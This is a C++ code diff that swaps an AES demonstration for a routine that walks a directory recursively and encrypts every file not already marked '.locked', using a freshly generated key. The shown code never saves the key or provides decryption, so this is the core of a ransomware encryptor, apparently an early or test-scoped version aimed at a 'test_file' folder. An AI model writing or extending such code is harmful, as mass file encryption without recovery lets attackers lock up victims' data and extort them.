@@ -1,6 +1,4 @@
-#include <iostream>
 #include <cryptopp/aes.h>
-
 #include <cryptopp/default.h>
 #include <cryptopp/osrng.h>
 #include <cryptopp/cryptlib.h>
@@ -11,6 +9,8 @@
 
 #include <boost/filesystem/operations.hpp>
 #include <iostream>
+#include <string>
+#include <vector>
 
 using namespace CryptoPP;
 using namespace boost::filesystem;
@@ -28,59 +28,21 @@ struct crypt_data {
 
 void encrypt(const crypt_data* data, string path);
 crypt_data* generatekey();
+void Traversal ( vector<string> & files );
 
 int main()
 {
-    //AES中使用的固定参数是以类AES中定义的enum数据类型出现的，而不是成员函数或变量
-    //因此需要用::符号来索引
-    cout << "AES Parameters: " << endl;
-    cout << "Algorithm name : " << AES::StaticAlgorithmName() << endl; 
-
-    //Crypto++库中一般用字节数来表示长度，而不是常用的字节数
-    cout << "Block size : " << AES::BLOCKSIZE * 8 << endl;
-    cout << "Min key length : " << AES::MIN_KEYLENGTH * 8 << endl;
-    cout << "Max key length : " << AES::MAX_KEYLENGTH * 8 << endl;
-
-    //AES中只包含一些固定的数据，而加密解密的功能由AESEncryption和AESDecryption来完成
-    //加密过程
-    AESEncryption aesEncryptor; //加密器 
-
-    unsigned char aesKey[AES::DEFAULT_KEYLENGTH]; //密钥
-    unsigned char inBlock[AES::BLOCKSIZE] = "123456789"; //要加密的数据块
-    unsigned char outBlock[AES::BLOCKSIZE]; //加密后的密文块
-    unsigned char xorBlock[AES::BLOCKSIZE]; //必须设定为全零
-
-    memset( xorBlock, 0, AES::BLOCKSIZE ); //置零
-
-    aesEncryptor.SetKey( aesKey, AES::DEFAULT_KEYLENGTH ); //设定加密密钥
-    aesEncryptor.ProcessAndXorBlock( inBlock, xorBlock, outBlock ); //加密
-
-    //以16进制显示加密后的数据
-    for( int i=0; i<16; i++ ) {
-        cout << hex << (int)outBlock[i] << " ";
-    }
-    cout << endl;
-
-    //解密
-    AESDecryption aesDecryptor;
-    unsigned char plainText[AES::BLOCKSIZE];
-
-    aesDecryptor.SetKey( aesKey, AES::DEFAULT_KEYLENGTH );
-    aesDecryptor.ProcessAndXorBlock( outBlock, xorBlock, plainText );
-
-    for( int i=0; i<16; i++ ) { 
-        cout << plainText[i]; 
-    }
-    cout << endl;
-
+    vector<string> filePaths;
+    Traversal(filePaths);
     // encrypt a file
     crypt_data* d = generatekey();
     cout<<"Start encrpt a file...\n";
-    class path pwd_path = current_path(); 
-    class path encryptFile = pwd_path / "test_file" / "README.md";
-    cout<<"The file path is : "<<encryptFile.c_str()<<endl;
+    for (int i=0; i<filePaths.size(); i++){
+        class path encryptFile = filePaths[i];
+        cout<<"The file path is : "<<encryptFile.c_str()<<endl;
+        encrypt(d, encryptFile.c_str());
+    }
 
-    encrypt(d, encryptFile.c_str());
     cout<<"Successfully encrypt...";
     return 0;
 }
@@ -141,4 +103,36 @@ crypt_data* generatekey() {
 	prng.GenerateBlock(d->iv, sizeof(d->iv));
 
 	return d;
+}
+
+string getSuffix(string strPath)
+{
+    int dotNum = strPath.rfind('.');
+    int suffixLen = strPath.length()-dotNum;
+    string suffix = strPath.substr(dotNum,suffixLen);
+    return suffix;
+}
+
+void Traversal ( vector<string> & files )
+{
+    class path pwd_path = current_path(); 
+    cout<< pwd_path<<endl;
+	class path test_file_path = pwd_path / "test_file";
+	recursive_directory_iterator beg_iter(test_file_path);
+	recursive_directory_iterator end_iter;
+	cout << "start walking...\n";
+	for (; beg_iter != end_iter; ++beg_iter) {
+        string strPath = beg_iter->path().string();
+		if (is_directory(*beg_iter)) {
+			cout<<current_path()<<endl;
+            continue;
+		}
+		else if (getSuffix(strPath) != ".locked")
+		{	
+            files.push_back(strPath);
+			cout<<strPath<<endl;
+		}
+        cout<<"view file: "<<strPath<<endl;
+	}
+	cout << "finish walking.\n";
 }
